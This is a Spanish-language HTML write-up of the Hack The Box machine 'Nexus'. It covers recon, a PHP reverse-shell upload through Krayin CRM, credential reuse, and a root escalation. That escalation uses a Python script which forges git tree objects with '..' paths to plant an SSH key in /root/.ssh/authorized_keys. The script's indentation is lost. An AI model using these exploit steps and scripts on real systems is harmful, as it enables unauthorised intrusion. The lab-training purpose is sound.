@@ -1,0 +1,863 @@
+<!DOCTYPE html>
+
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Writeup: Nexus</title>
+  <link rel="stylesheet" href="../styles.css" />
+
+  <style>
+    .code-block {
+      position: relative;
+      background: var(--bg-soft);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      margin: 1rem 0;
+    }
+
+    .code-block pre {
+      margin: 0;
+      padding: 0.75rem;
+      overflow-x: auto;
+    }
+
+    .copy-btn {
+      position: absolute;
+      top: 8px;
+      right: 8px;
+      background: var(--bg);
+      color: var(--accent);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      padding: 0.2rem 0.5rem;
+      font-size: 0.8rem;
+      cursor: pointer;
+      transition: background 0.2s ease;
+    }
+
+    .copy-btn:hover {
+      background: rgba(64,255,156,0.1);
+    }
+
+    .terminal-output {
+      background: #050505;
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 0.75rem;
+      overflow-x: auto;
+    }
+
+    .info-box {
+      border-left: 3px solid var(--accent);
+      padding: 0.75rem 1rem;
+      margin: 1rem 0;
+      background: var(--bg-soft);
+      border-radius: 4px;
+    }
+
+    .warning-box {
+      border-left: 3px solid #ffcc66;
+      padding: 0.75rem 1rem;
+      margin: 1rem 0;
+      background: var(--bg-soft);
+      border-radius: 4px;
+    }
+
+    .screenshot {
+      width: 100%;
+      max-width: 1000px;
+      display: block;
+      margin: 1.5rem auto;
+      border-radius: 6px;
+      border: 1px solid var(--border);
+    }
+  </style>
+
+</head>
+
+<body>
+  <main class="container">
+
+
+<!-- Imagen de la máquina -->
+<section class="card">
+  <img src="img/nexus.png" alt="Máquina Nexus" class="machine-img"/>
+</section>
+
+<!-- Navegación -->
+<section class="card" style="text-align:center; margin-top:2rem;">
+  <button class="nav-btn" onclick="history.back()">⬅ Volver</button>
+  <button class="nav-btn" onclick="window.print()">⬇ Descargar PDF</button>
+  <button class="nav-btn" onclick="likePost()">
+    👍 Me gusta <span id="like-count">0</span>
+  </button>
+</section>
+
+<!-- Metadatos -->
+<section class="card">
+  <h2>Nexus</h2>
+
+  <p class="post-desc">
+    Plataforma: Hack The Box · Dificultad: Fácil · Fecha: Septiembre 2026
+  </p>
+
+  <ul class="post-tags">
+    <li>#HTB</li>
+    <li>#hackthebox</li>
+    <li>#nexus</li>
+    <li>#fileupload</li>
+    <li>#directorypathtraversal</li>
+    <li>#rce</li>
+    <li>#gitea</li>
+    <li>#ssh</li>
+  </ul>
+</section>
+
+<!-- Reconocimiento -->
+<section class="card">
+  <h3>Reconocimiento</h3>
+
+  <p>
+    Comenzamos realizando un escaneo completo de puertos para identificar
+    los servicios expuestos en la máquina:
+  </p>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+    <pre><code>nmap -p- -sS -n -Pn -vvv 10.129.110.62 -oG allPorts</code></pre>
+  </div>
+
+  <p>Resultado:</p>
+
+  <pre><code>80
+
+
+22</code></pre>
+
+
+  <p>
+    Una vez identificados los puertos abiertos, realizamos un escaneo más
+    exhaustivo para determinar las versiones de los servicios y ejecutar
+    algunos scripts básicos de reconocimiento:
+  </p>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+    <pre><code>nmap -sCV 10.129.110.62 -oN targeted</code></pre>
+  </div>
+
+  <p>Resultado relevante:</p>
+
+  <div class="terminal-output">
+    <pre><code>PORT   STATE SERVICE VERSION
+
+
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://nexus.htb/
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+
+Service Info:
+OS: Linux</code></pre> </div>
+
+
+  <p>
+    El servicio web nos redirige al dominio <code>nexus.htb</code>, por lo
+    que lo añadimos al archivo <code>/etc/hosts</code>:
+  </p>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+    <pre><code>sudo nano /etc/hosts
+
+
+10.129.110.62 nexus.htb</code></pre> </div> </section>
+
+
+<!-- Enumeración -->
+<section class="card">
+  <h3>Enumeración</h3>
+
+  <p>
+    Accedemos al sitio web principal para revisar su contenido y buscar
+    posibles puntos de interés.
+  </p>
+
+  <p>
+    Durante la navegación encontramos una solicitud relacionada con un
+    puesto de trabajo. En ella aparecen dos direcciones de correo:
+  </p>
+
+  <pre><code>j.matthew@nexus.htb
+
+
+[careers@nexus.htb](mailto:careers@nexus.htb)</code></pre>
+
+
+  <p>
+    No encontramos más información relevante en la página principal, por
+    lo que continuamos con la enumeración de subdominios mediante
+    <strong>fuzzing</strong>.
+  </p>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+    <pre><code>ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ \
+
+
+-u http://nexus.htb/ 
+-H "Host: FUZZ.nexus.htb"</code></pre> </div>
+
+
+  <p>Resultado:</p>
+
+  <pre><code>git      [Status: 200, Size: 14879, Words: 1254, Lines: 247]
+
+
+billing  [Status: 302, Size: 390, Words: 60, Lines: 12]</code></pre>
+
+
+  <h4>Subdominio Git</h4>
+
+  <p>
+    El primer subdominio interesante es <code>git.nexus.htb</code>.
+    Al acceder encontramos una instalación de <strong>Gitea</strong>,
+    utilizada para gestionar los repositorios del proyecto.
+  </p>
+
+  <img src="img/nexus_1.png" alt="Gitea en Nexus" class="screenshot"/>
+
+  <p>
+    Dentro del repositorio perteneciente al usuario <code>admin</code>
+    encontramos un archivo <code>docker.yml</code> y, entre los archivos
+    del proyecto, referencias a un archivo <code>.env</code>.
+  </p>
+
+  <p>
+    Aunque las credenciales ya no aparecen en la versión actual del
+    proyecto, podemos revisar el <strong>historial de cambios</strong>
+    del repositorio y localizar una versión anterior que contiene
+    información sensible.
+  </p>
+
+  <img src="img/nexus_2.png" alt="Historial de cambios de Gitea" class="screenshot"/>
+
+  <div class="info-box">
+    <strong>Hallazgo:</strong>
+    el historial de Git contiene credenciales que fueron eliminadas de la
+    versión actual del proyecto, pero permanecen disponibles en commits
+    anteriores.
+  </div>
+
+  <p>
+    Con las credenciales recuperadas podemos acceder al segundo subdominio:
+    <code>billing.nexus.htb</code>.
+  </p>
+
+  <img src="img/nexus_3.png" alt="Panel de login de Nexus" class="screenshot"/>
+
+  <p>
+    Utilizamos el correo encontrado anteriormente:
+    <code>j.matthew@nexus.htb</code>, junto con la contraseña obtenida del
+    historial del repositorio.
+  </p>
+
+  <p>
+    Las credenciales son válidas y conseguimos acceder al panel de
+    administración.
+  </p>
+
+  <img src="img/nexus_4.png" alt="Panel de administración de Krayin" class="screenshot"/>
+
+  <p>
+    Revisando el perfil del usuario podemos identificar que la aplicación
+    utilizada es <strong>Krayin CRM 2.2.0</strong>.
+  </p>
+
+  <p>
+    La versión resulta especialmente interesante debido a la existencia de
+    una vulnerabilidad identificada como <code>CVE-2026-38526</code>,
+    asociada a la posibilidad de conseguir ejecución remota de código.
+  </p>
+
+  <p>
+    En lugar de utilizar directamente un exploit automatizado, vamos a
+    reproducir manualmente el vector de ataque.
+  </p>
+</section>
+
+<!-- Explotación -->
+<section class="card">
+  <h3>Explotación</h3>
+
+  <h4>File Upload → RCE</h4>
+
+  <p>
+    Dentro del panel de Krayin encontramos la funcionalidad
+    <strong>Compose Mail</strong>, que permite crear correos electrónicos
+    y adjuntar archivos.
+  </p>
+
+  <p>
+    El problema se encuentra en el mecanismo de subida de archivos.
+    Aunque la interfaz espera una imagen, el archivo adjunto no se valida
+    correctamente y podemos proporcionar un archivo con una extensión
+    diferente.
+  </p>
+
+  <p>
+    Debido a que el entorno ejecuta PHP, aprovechamos esta funcionalidad
+    para subir un archivo <code>reverse_shell.php</code>.
+  </p>
+
+  <img src="img/nexus_5.png" alt="Petición de subida de archivo" class="screenshot"/>
+
+  <p>
+    Interceptamos la petición con Burp Suite y la enviamos para analizar
+    la respuesta del servidor.
+  </p>
+
+  <p>
+    La respuesta nos proporciona la ruta en la que se ha almacenado el
+    archivo subido.
+  </p>
+
+  <div class="info-box">
+    <strong>Vector de ataque:</strong>
+    subida de un archivo PHP ejecutable mediante una funcionalidad que
+    originalmente esperaba recibir una imagen.
+  </div>
+
+  <p>
+    Antes de acceder al archivo, ponemos a la escucha nuestra máquina
+    atacante:
+  </p>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+    <pre><code>nc -lvnp 446</code></pre>
+  </div>
+
+  <p>
+    Finalmente accedemos desde el navegador a la ruta proporcionada por
+    la respuesta del servidor. El código PHP se ejecuta y recibimos una
+    conexión:
+  </p>
+
+  <div class="terminal-output">
+    <pre><code>Linux nexus 6.8.0-106-generic #106-Ubuntu SMP PREEMPT_DYNAMIC Fri Mar 6 07:58:08 UTC 2026
+
+
+x86_64 x86_64 x86_64 GNU/Linux
+
+14:33:43 up 1:14, 0 user, load average: 0.00, 0.00, 0.00
+
+USER       TTY      FROM     LOGIN@   IDLE   JCPU   PCPU WHAT
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+/bin/sh: 0: can't access tty; job control turned off
+$</code></pre> </div>
+
+
+  <p>
+    La shell obtenida pertenece al usuario <code>www-data</code>. Para
+    mejorar la estabilidad de la terminal podemos utilizar:
+  </p>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+    <pre><code>script /dev/null -c /bin/bash</code></pre>
+  </div>
+</section>
+
+<!-- Pivoting -->
+<section class="card">
+  <h3>Pivoting</h3>
+
+  <p>
+    Una vez dentro del sistema comenzamos a enumerar usuarios y archivos
+    de configuración.
+  </p>
+
+  <p>
+    Entre los usuarios locales encontramos <code>jones</code>.
+  </p>
+
+  <p>
+    Como ya sabemos que la aplicación Krayin se encuentra desplegada en
+    <code>/var/www/html</code>, revisamos su archivo de configuración
+    <code>.env</code>:
+  </p>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+    <pre><code>cat /var/www/html/.env</code></pre>
+  </div>
+
+  <p>Entre la información encontrada:</p>
+
+  <div class="terminal-output">
+    <pre><code>&lt;SNIP&gt;
+
+
+DB_USERNAME=krayin
+DB_PASSWORD=y27xb3ha!!74GbR
+DB_PREFIX=
+
+<SNIP></code></pre> </div>
+
+
+  <p>
+    Probamos la contraseña encontrada contra el usuario
+    <code>jones</code> mediante SSH:
+  </p>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+    <pre><code>ssh jones@nexus.htb -p 22</code></pre>
+  </div>
+
+  <p>La autenticación es correcta:</p>
+
+  <div class="terminal-output">
+    <pre><code>jones@nexus:~$ id
+
+
+uid=1000(jones) gid=1000(jones) groups=1000(jones),100(users)</code></pre> </div>
+
+
+  <p>
+    De esta forma conseguimos avanzar desde el usuario de servicio
+    <code>www-data</code> hasta el usuario <code>jones</code>.
+  </p>
+</section>
+
+<!-- Escalada de privilegios -->
+<section class="card">
+  <h3>Escalada de privilegios</h3>
+
+  <h4>Gitea Template Directory Traversal</h4>
+
+  <p>
+    Con el usuario <code>jones</code> continuamos enumerando los servicios
+    que se ejecutan periódicamente en el sistema.
+  </p>
+
+  <p>
+    Encontramos un temporizador de <strong>systemd</strong> que ejecuta
+    un servicio de sincronización de plantillas cada dos minutos:
+  </p>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+    <pre><code>systemctl list-timers</code></pre>
+  </div>
+
+  <div class="terminal-output">
+    <pre><code>NEXT                    LEFT   UNIT                       ACTIVATES
+
+
+Thu 2026-03-05 18:02:00 UTC  1min
+gitea-template-sync.timer    gitea-template-sync.service</code></pre> </div>
+
+
+  <p>
+    Investigando el servicio encontramos el script:
+  </p>
+
+  <pre><code>/etc/gitea/template-sync.py</code></pre>
+
+  <p>
+    Este script clona los repositorios de plantillas y posteriormente
+    sincroniza los archivos dentro del directorio de staging:
+  </p>
+
+  <pre><code>/home/git/template-staging/&lt;owner&gt;/&lt;repo&gt;/</code></pre>
+
+  <p>
+    El problema aparece en el tratamiento de las rutas procedentes de
+    <code>git ls-tree</code>. El script utiliza directamente
+    <code>os.path.join()</code> sin validar correctamente los componentes
+    de la ruta:
+  </p>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+    <pre><code>target = os.path.join(stage_path, filepath)
+
+
+os.makedirs(os.path.dirname(target), exist_ok=True)</code></pre> </div>
+
+
+  <p>
+    Si una ruta contiene componentes <code>..</code>, podemos provocar un
+    <strong>directory traversal</strong> y conseguir que el archivo se
+    escriba fuera del directorio de staging previsto.
+  </p>
+
+  <div class="warning-box">
+    <strong>Concepto:</strong>
+    la vulnerabilidad se produce porque las rutas provenientes del
+    repositorio no se normalizan ni validan antes de utilizarlas para
+    construir la ruta de destino.
+  </div>
+
+  <p>
+    El objetivo será utilizar esta vulnerabilidad para escribir una clave
+    pública SSH en:
+  </p>
+
+  <pre><code>/root/.ssh/authorized_keys</code></pre>
+
+  <h4>Generación de la clave SSH</h4>
+
+  <p>
+    Primero generamos localmente un par de claves SSH que utilizaremos
+    posteriormente para autenticarnos como <code>root</code>:
+  </p>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+    <pre><code>ssh-keygen -t ed25519 -f /tmp/.k -N ''</code></pre>
+  </div>
+
+  <h4>Creación del repositorio</h4>
+
+  <p>
+    Volvemos a Gitea utilizando las credenciales obtenidas anteriormente.
+    Creamos un nuevo repositorio llamado <code>rce</code> y lo configuramos
+    como repositorio de plantilla para que el servicio de sincronización
+    pueda procesarlo.
+  </p>
+
+  <img src="img/nexus_6.png" alt="Creación del repositorio plantilla" class="screenshot"/>
+
+  <p>
+    A continuación clonamos el repositorio:
+  </p>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+    <pre><code>cd /tmp
+
+
+git clone http://jones:'y27xb3ha!!74GbR'@git.nexus.htb/jones/rce.git
+
+cd rce
+
+touch README.md</code></pre> </div>
+
+
+  <img src="img/nexus_7.png" alt="Repositorio RCE en Gitea" class="screenshot"/>
+
+  <h4>Construcción del objeto Git</h4>
+
+  <p>
+    Las comprobaciones habituales de Git impiden crear directamente
+    archivos cuyas rutas contienen componentes de recorrido como
+    <code>..</code>.
+  </p>
+
+  <p>
+    Para evitar esta restricción construimos manualmente los objetos Git
+    directamente dentro de <code>.git/objects/</code>. De esta forma
+    podemos crear un árbol que contenga las rutas necesarias para que el
+    servicio vulnerable las procese.
+  </p>
+
+  <p>
+    Creamos el archivo <code>build.py</code> con el siguiente contenido:
+  </p>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+    <pre><code>#!/usr/bin/env python3
+
+
+import hashlib,zlib,os,subprocess,sys,time
+
+def write_obj(data,t):
+h=("%s %d"%(t,len(data))).encode()+b"\x00"
+s=h+data
+sha=hashlib.sha1(s).hexdigest()
+
+
+d=os.path.join(".git","objects",sha[:2])
+os.makedirs(d,exist_ok=True)
+
+p=os.path.join(d,sha[2:])
+
+if not os.path.exists(p):
+    open(p,"wb").write(zlib.compress(s))
+
+return sha
+
+
+def entry(mode,name,sha):
+return ("%s %s"%(mode,name)).encode()+b"\x00"+bytes.fromhex(sha)
+
+if not os.path.isdir(".git"):
+print("Run inside git repo")
+sys.exit(1)
+
+r=subprocess.run(
+["cat","/tmp/.k.pub"],
+capture_output=True,
+text=True
+)
+
+if r.returncode!=0:
+print("ssh-keygen -t ed25519 -f /tmp/.k -N ''")
+sys.exit(1)
+
+key=r.stdout.strip()+"\n"
+
+blob=write_obj(key.encode(),"blob")
+readme=write_obj(b"# Template\n","blob")
+
+ssh_t=write_obj(
+entry("100644","authorized_keys",blob),
+"tree"
+)
+
+cur=write_obj(
+entry("40000",".ssh",ssh_t),
+"tree"
+)
+
+fir=write_obj(
+entry("40000","root",cur),
+"tree"
+)
+
+for i in range(4):
+fir=write_obj(
+entry("40000","..",fir),
+"tree"
+)
+
+root=write_obj(
+entry("100644","README.md",readme)+
+entry("40000","..",fir),
+"tree"
+)
+
+ts=int(time.time())
+
+c="tree %s\nauthor x [x@x](mailto:x@x) %d +0000\ncommitter x [x@x](mailto:x@x) %d +0000\n\ninit\n"%(root,ts,ts)
+
+sha=write_obj(c.encode(),"commit")
+
+os.makedirs(
+os.path.join(".git","refs","heads"),
+exist_ok=True
+)
+
+open(
+os.path.join(".git","refs","heads","main"),
+"w"
+).write(sha+"\n")
+
+print("Done: "+sha)</code></pre> </div>
+
+
+  <p>
+    Ejecutamos el script:
+  </p>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+    <pre><code>python3 /tmp/build.py</code></pre>
+  </div>
+
+  <p>Obtenemos:</p>
+
+  <div class="terminal-output">
+    <pre><code>Done: 025b473292e1fdcdb027771defd8d3d0279c709f</code></pre>
+  </div>
+
+  <p>
+    Finalmente hacemos push de la rama creada:
+  </p>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+    <pre><code>git push -u origin main --force</code></pre>
+  </div>
+
+  <p>
+    Ahora debemos esperar a que se ejecute el temporizador de
+    sincronización de plantillas.
+  </p>
+
+  <p>
+    Cuando el servicio procesa nuestro repositorio, interpreta las rutas
+    con los componentes <code>..</code> y termina escribiendo la clave
+    pública en el directorio SSH de <code>root</code>.
+  </p>
+
+  <div class="info-box">
+    <strong>Resultado:</strong>
+    la vulnerabilidad de directory traversal permite escapar del
+    directorio de staging y escribir el archivo
+    <code>/root/.ssh/authorized_keys</code>.
+  </div>
+
+  <h4>Acceso como root</h4>
+
+  <p>
+    Una vez que nuestra clave pública se encuentra en
+    <code>/root/.ssh/authorized_keys</code>, podemos utilizar la clave
+    privada generada anteriormente para autenticarnos como
+    <code>root</code>:
+  </p>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+    <pre><code>ssh -i /tmp/.k root@nexus.htb</code></pre>
+  </div>
+
+  <p>
+    Finalmente conseguimos una shell como <strong>root</strong>:
+  </p>
+
+  <div class="terminal-output">
+    <pre><code>Welcome to Ubuntu 24.04.4 LTS
+
+
+(GNU/Linux 6.8.0-106-generic x86_64)
+
+root@nexus:~# ls -la /root/root.txt
+
+-rw-r----- 1 root root 21 Apr 23 18:14 /root/root.txt</code></pre> </div>
+
+
+  <p>
+    Con esto obtenemos acceso completo a la máquina y podemos leer la
+    <strong>flag de root</strong>.
+  </p>
+</section>
+
+<!-- Resumen -->
+<section class="card">
+  <h3>Resumen de la cadena de ataque</h3>
+
+  <ol>
+    <li>Enumeración de puertos con <code>nmap</code>.</li>
+    <li>Identificación del dominio <code>nexus.htb</code>.</li>
+    <li>Descubrimiento de los subdominios <code>git</code> y <code>billing</code>.</li>
+    <li>Obtención de credenciales mediante el historial de Git.</li>
+    <li>Acceso al panel de Krayin como <code>j.matthew</code>.</li>
+    <li>Explotación del file upload para conseguir una reverse shell.</li>
+    <li>Lectura del <code>.env</code> de Krayin y reutilización de credenciales.</li>
+    <li>Acceso por SSH como <code>jones</code>.</li>
+    <li>Identificación del servicio periódico de sincronización de plantillas.</li>
+    <li>Explotación del directory traversal en <code>template-sync.py</code>.</li>
+    <li>Escritura de una clave SSH en <code>/root/.ssh/authorized_keys</code>.</li>
+    <li>Acceso final como <code>root</code>.</li>
+  </ol>
+</section>
+
+<!-- Comentarios -->
+<section class="card" style="margin-top:2rem;">
+  <h3>Comentarios</h3>
+
+  <textarea
+    id="comment-input"
+    placeholder="Escribe tu comentario..."
+    class="comment-box"></textarea>
+
+  <br/>
+  <br/>
+
+  <button class="nav-btn" onclick="addComment()">
+    Enviar comentario
+  </button>
+
+  <ul
+    id="comment-list"
+    style="margin-top:1rem; text-align:left;">
+  </ul>
+</section>
+
+
+  </main>
+
+  <script>
+    // --- Copiar código ---
+    function copyCode(button) {
+      const code = button.parentElement.querySelector("code").innerText;
+
+      navigator.clipboard.writeText(code).then(() => {
+        const originalText = button.textContent;
+        button.textContent = "¡Copiado!";
+
+        setTimeout(() => {
+          button.textContent = originalText;
+        }, 1200);
+      });
+    }
+
+    // --- Likes ---
+    let likes = parseInt(localStorage.getItem("likes") || "0");
+
+    document.getElementById("like-count").textContent = likes;
+
+    function likePost() {
+      likes++;
+
+      document.getElementById("like-count").textContent = likes;
+
+      localStorage.setItem("likes", likes);
+    }
+
+    // --- Comentarios ---
+    function addComment() {
+      const input = document.getElementById("comment-input");
+      const text = input.value.trim();
+
+      if (text !== "") {
+        const li = document.createElement("li");
+
+        li.textContent = text;
+
+        document
+          .getElementById("comment-list")
+          .appendChild(li);
+
+        let comments = JSON.parse(
+          localStorage.getItem("comments") || "[]"
+        );
+
+        comments.push(text);
+
+        localStorage.setItem(
+          "comments",
+          JSON.stringify(comments)
+        );
+
+        input.value = "";
+      }
+    }
+
+    // --- Cargar comentarios ---
+    window.onload = () => {
+      const savedComments = JSON.parse(
+        localStorage.getItem("comments") || "[]"
+      );
+
+      savedComments.forEach(comment => {
+        const li = document.createElement("li");
+
+        li.textContent = comment;
+
+        document
+          .getElementById("comment-list")
+          .appendChild(li);
+      });
+    };
+  </script>
+
+</body>
+</html>
